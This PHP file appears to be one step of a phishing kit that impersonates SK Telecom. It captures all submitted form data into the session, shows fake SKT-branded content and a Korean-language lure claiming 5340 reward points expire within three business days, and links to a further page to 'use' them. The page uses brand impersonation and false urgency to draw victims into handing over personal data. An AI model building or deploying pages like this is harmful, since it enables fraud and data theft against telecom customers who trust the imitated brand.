<?php
session_start();

include('partials/header-good.php');
//include('partials/header-new.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<style>
    .wrap {
        padding: 30px 20px;
/*        margin-top:70px;*/
        padding-bottom: 0px;
    }
    @media only screen and (max-width: 1024px){
.planImages ul .gist[data-v-42547111] {

    font-size: 24px !important;

}
}
    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: red;
        font-size: 19px;
        font-weight: bold;
    }
    .notice {
        line-height:2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
        word-wrap:break-word;
    }
    @media(max-width: 767px) {
        body.page-index .index-ir .inner .counter {
    width: -webkit-calc(100% - 70px);
    width: -moz-calc(100% - 70px);
    width: calc(100% - 128px) !important;
    margin-top: -7px;
}body.page-index .index-ir .inner .title-wrap {
    width: 100%;
}
        .submit-btn {
            width: 100%;
            line-height: 47px;
            text-align: center;
            display: inline-block;
            color: #fff !important;
            border-radius: 30px;
            background: #ff7a00;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: red;
            border-color: red;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
	 .grid-second {
    	border-top: 1px solid #1c1c1c;
    	border-bottom: 1px solid #1c1c1c;
	}
        .grid-second .item .link {
        margin: 15px 0 15px 3px;
         display:flex;
      }
       .grid-second .item .link .text {
      width: 49.24%;
      padding-right: 25px;
     }
    .grid-second .item .link .thumb {
      width: 50.76%;
     }
.grid-second .item .link .text .grid-news-title{
    font-size: 15px;
    line-height: 20px;
    margin-bottom:15px;
    display:block;
   }
    }
</style>
<div class="wrap">
       
    <div class="contents" id="pressContents">                    
<!-- ???? ???// -->
<div class="grid-second" style="opacity: 1; transform: translate(0px, 0px);">
    <div class="item">
    <a href="/en/press/press_detail.do?idx=1574" target="_self" class="link" title="SK Telecom Announces 2Q 2023 Earnings Results ">
      <!-- ??? & ?? -->
      <span class="text">
        <span class="grid-news-title">SK Telecom：사용 가능한 포인트는 영업일 기준 3일 이내에 만료되므로 최대한 빨리 상품을 사용하세요! </span>
        <span class="grid-news-date">2023.08.12</span>
      </span>
      <!-- ??? -->
      <span class="thumb">
        <img src="<?php echo $folder_path;?>/assets/images/news21111002.jpg" alt="SKT Publishes 6G White Paper to Present Blueprint for Future Networks" class="img" draggable="false">
      </span>
    </a>
  </div>
 </div>
<!-- //???? ??? -->  
               
  </div>
</div>
<!-- ???? ???// -->
<div class="index-ir" style="margin-top:30px;">
        <div class="inner">
          <div class="title-wrap">
            <h2 class="title"><span style="font-weight:bolder; color:black;">사용 가능한 포인트</span> <span style="font-weight:bolder; color:red; float:right;">  5340 점 </span></h2>
          </div>
          <!-- ??? -->
          <div class="counter">
         
           <!--  <iframe src="https://asia.tools.euroland.com/tools/ticker/scrolling/?companycode=kr-skm&amp;lang=en-gb" title="IR INFO"></iframe>
              <p class="price">309,000<span class="unit">?</span></p>
            <p class="compare icon-plus">3,000 (+0.96%)</p> -->
          </div>
         </div>
        
<div class="center" style="margin-bottom:30px;">
        <a href="page6.php" class="btn submit-btn">포인트 사용</a>
       </div>

 </div>
<!-- //???? ??? -->  
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
include('partials/footer-good.php');
